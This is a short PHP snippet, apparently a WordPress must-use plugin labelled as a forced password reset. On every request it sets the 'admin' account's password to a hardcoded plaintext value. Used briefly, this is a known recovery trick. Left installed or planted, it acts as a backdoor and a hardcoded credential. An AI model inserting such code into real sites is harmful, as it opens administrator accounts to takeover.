<?php
// Reset de senha forçado (Must-Use Plugin)
add_action('init', function() {
    $user = get_user_by('login', 'admin');
    if ($user) {
        wp_set_password('Castro771920', $user->ID);
    }
});
